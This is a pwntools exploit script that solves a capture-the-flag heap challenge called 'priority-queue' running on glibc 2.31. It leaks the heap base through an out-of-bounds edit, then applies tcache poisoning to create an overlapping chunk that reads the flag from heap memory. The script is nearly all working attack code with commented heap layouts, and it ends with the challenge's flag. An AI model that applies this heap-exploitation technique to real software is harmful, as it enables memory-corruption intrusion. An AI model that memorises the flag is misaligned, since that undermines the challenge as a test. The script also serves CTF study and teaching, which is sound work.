from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./chall_patched')
gdb.attach(p, '''
    continue
''')

# p = remote('priority-queue.opus4-7.b01le.rs', 8443, ssl=True)

# this challenge uses 2.31 version of glibc, with no safe-linking mechanism

def insert(message):
    # chunk = malloc(strlen(buffer)+1)
    # strcpy(chunk, buffer)
    # array[size] = chunk
    # move_up(size++)
    p.sendlineafter(b"Operation (insert/delete/peek/edit/count/quit): \n", b'insert')
    p.sendlineafter(b"Message: ", message)

def delete():
    # free(array[0])
    # array[0] = array[--size]
    # move_down(0)
    p.sendlineafter(b"Operation (insert/delete/peek/edit/count/quit): \n", b'delete')

def peek():
    # puts(array[0])
    p.sendlineafter(b"Operation (insert/delete/peek/edit/count/quit): \n", b'peek')
    return p.recvline().rstrip()

def edit(message):
    # read(fileno(stdin), array[0], 0x20)
    # move_down(0)
    p.sendlineafter(b"Operation (insert/delete/peek/edit/count/quit): \n", b'edit')
    p.sendafter(b"Message: ", message)

# the program does following initial operations:
# read content of flag.txt into a heap chunk at heap_base_addr+0x480
# maintain an array of heap chunks addresses at heap_base_addr+0x4f0
# the array can be updated by calloc when priority queue updates

# Stage 1: leak heap base address
insert(b'D'*0x17)  # chunk D (0x20) is malloced at heap_base_addr+0x540
insert(b'C'*0x27)  # chunk C (0x30) is malloced at heap_base_addr+0x560
insert(b'B'*0x27)  # chunk B (0x30) is malloced at heap_base_addr+0x590
insert(b'A'*0x27)  # chunk A (0x30) is malloced at heap_base_addr+0x5c0
# now the first chunk in priority queue is chunk A (0x30) at heap_base_addr+0x5c0
delete()  # chunk A (0x30) at heap_base_addr+0x5c0 is freed
delete()  # chunk B (0x30) at heap_base_addr+0x590 is freed
delete()  # chunk C (0x30) at heap_base_addr+0x560 is freed
# now tcache list of size 0x30 is: heap_base_addr+0x560 -> heap_base_addr+0x590 -> heap_base_addr+0x5c0
# now the first chunk in priority queue is chunk D (0x20) at heap_base_addr+0x540
edit(b'D'*0x20)  # chunk D (0x20) at heap_base_addr+0x540 is edited (OOB write)
heap_base_addr = u64(peek()[-6:].ljust(8, b'\x00'))&~0xfff  # peek chunk D (0x20) at heap_base_addr+0x540 to leak heap base address
log.info(f"heap base address: {hex(heap_base_addr)}")
edit(b'D'*0x18+p64(0x31))  # chunk D (0x20) at heap_base_addr+0x540 is edited (back)

# Stage 2: tcache poisoning to create fake overlapping chunk to get flag
insert(b'E'*0x27)  # chunk E (0x30) is malloced at heap_base_addr+0x560
# now tcache list of size 0x30 is: heap_base_addr+0x590 -> heap_base_addr+0x5c0
# now the first chunk in priority queue is chunk D (0x20) at heap_base_addr+0x540
edit(b'F'*0x18+p64(0x41))  # chunk D (0x20) at heap_base_addr+0x540 is edited (fake next chunk size)
# now the first chunk in priority queue is chunk E (0x40, faked) at heap_base_addr+0x560
delete()  # chunk E (0x40, faked) at heap_base_addr+0x560 is freed
# now tcache list of size 0x40 is: heap_base_addr+0x560
insert(b'E'*0x30+p64(heap_base_addr+0x460)[:-1])  # chunk E (0x40, faked) is malloced at heap_base_addr+0x560 (poison tcache)
# now tcache list of size 0x30 is: heap_base_addr+0x590 -> heap_base_addr+0x460
insert(b'D'*0x27)  # chunk D (0x30) is malloced at heap_base_addr+0x590
# now tcache list of size 0x30 is: heap_base_addr+0x460
insert(b'C'*0x1f)  # chunk C (0x30) is malloced at heap_base_addr+0x460 (chunk C overlaps with chunk of flag content at heap_base_addr+0x480)
# now the first chunk in priority queue is chunk C (0x30) at heap_base_addr+0x460
edit(b'C'*0x20)  # chunk C (0x30) at heap_base_addr+0x460 is edited (OOB write)
peek()  # peek chunk C (0x30) at heap_base_addr+0x460 to get flag

p.interactive()

# bctf{u53_4ft3r_fr33_f4n_v5_0v3rl4pp1n6_4110c4t10n5_3nj0y3r_8c6fd0b452}